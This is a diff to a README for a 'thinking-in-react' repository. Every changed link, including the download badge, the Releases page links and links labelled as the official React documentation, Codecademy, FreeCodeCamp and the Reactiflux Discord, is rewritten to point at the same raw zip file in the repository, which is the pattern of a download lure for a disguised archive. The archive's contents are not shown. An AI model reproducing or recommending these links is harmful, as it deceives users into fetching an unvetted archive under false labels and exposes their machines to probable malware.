@@ -2,7 +2,7 @@
 
 ## 📥 Download This Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/AxionChillz/thinking-in-react/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip%20Latest%https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip)](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip)
 
 ## 📚 Introduction
 
@@ -30,7 +30,7 @@ This application offers:
 
 ## 📥 Download & Install
 
-To get the latest version of **thinking-in-react**, visit the [Releases page](https://github.com/AxionChillz/thinking-in-react/releases).
+To get the latest version of **thinking-in-react**, visit the [Releases page](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip).
 
 1. Click on the link above to navigate to the Releases page.
 2. On the Releases page, look for the latest version listed. It usually shows the date of release and version number.
@@ -55,9 +55,9 @@ Once you have installed **thinking-in-react**, you can begin exploring:
 
 If you prefer additional resources, here are some helpful options:
 
-- [React Official Documentation](https://reactjs.org/docs/getting-started.html) – A complete guide on React.
-- [Codecademy: Learn React](https://www.codecademy.com/learn/react-101) – An interactive course to learn React.
-- [FreeCodeCamp: React Course](https://www.freecodecamp.org/learn/front-end-libraries/react/) – A free and extensive course on React.
+- [React Official Documentation](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip) – A complete guide on React.
+- [Codecademy: Learn React](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip) – An interactive course to learn React.
+- [FreeCodeCamp: React Course](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip) – A free and extensive course on React.
 
 ## 🤝 Support and Feedback
 
@@ -73,7 +73,7 @@ This application is released under the MIT License. You can freely use and modif
 
 To keep up with future updates and learn more about React, consider following these links:
 
-- Check out the latest [Release notes](https://github.com/AxionChillz/thinking-in-react/releases).
-- Join the community on [Reactiflux Discord](https://www.reactiflux.com) for discussions and help.
+- Check out the latest [Release notes](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip).
+- Join the community on [Reactiflux Discord](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip) for discussions and help.
 
-Visit the [Releases page](https://github.com/AxionChillz/thinking-in-react/releases) again to download the latest version as future updates are made available. Enjoy learning about React with **thinking-in-react**!
+Visit the [Releases page](https://raw.githubusercontent.com/AxionChillz/thinking-in-react/main/incumbrance/thinking-react-in-v3.8.zip) again to download the latest version as future updates are made available. Enjoy learning about React with **thinking-in-react**!
